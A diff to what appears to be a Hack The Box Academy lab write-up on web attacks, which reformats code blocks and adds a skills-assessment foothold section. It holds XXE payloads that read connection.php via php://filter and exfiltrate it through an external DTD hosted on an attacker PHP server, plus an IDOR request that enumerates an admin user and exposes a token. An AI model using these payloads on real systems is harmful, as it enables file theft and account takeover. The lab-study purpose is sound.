@@ -140,7 +140,7 @@ Cookie: role=employee
 
 >Insert the following XML code:  
 
-``xml
+```xml
 <!DOCTYPE email [
   <!ENTITY fuzzer SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
 ]>
@@ -194,7 +194,7 @@ if(isset($_GET['content'])){
 ?>
 ```  
 
-<Hosting XML DTD Exploit server to receive incoming blind response from target contain base64 file string.  
+>Hosting XML DTD Exploit server to receive incoming blind response from target contain base64 file string.  
 
 ```
 php -S 0.0.0.0:80
@@ -202,7 +202,7 @@ php -S 0.0.0.0:80
 
 >Request with XXE payload:  
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://10.10.15.38:80/blind.dtd">
@@ -210,20 +210,38 @@ php -S 0.0.0.0:80
   %oob;
 ]>
 <root>
- &content;
- </root>
-```
+&content;
+</root>
+```    
 
->Burp Suite Request
-
-![HTB xxe-dtd-blind-error-messages](/images/xxe-dtd-blind-error-messages.png)  
-
+>Burp Suite Request send the blind xxe payload and php hosted exploit server receive the base64 file contents.  
+  
 # Web Attacks - Skills Assessment  
 
 >[Scenario](https://academy.hackthebox.com/module/134/section/1219) You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. 
 >The login details are provided to `94.237.49.11` with user `htb-student` and password `Academy_student!`.  
 
+## Foothold  
+
 ![web-attack-skills-assessment](/images/web-attack-skills-assessment.png)  
+
+>Enumeration of uid's, discovered administrator account as `52`. No authentication cookie required.  
+
+```
+GET /api.php/user/§52§ HTTP/1.1
+Host: 94.237.49.11:42268
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36
+Accept: */*
+Referer: http://94.237.49.11:42268/profile.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```  
+
+![web-attack-skills-assessment-enum-admin-user](/images/web-attack-skills-assessment-enum-admin-user.png)  
+
+>Get admin token, `{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}` and the response is `{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}`  
+
 
 
 
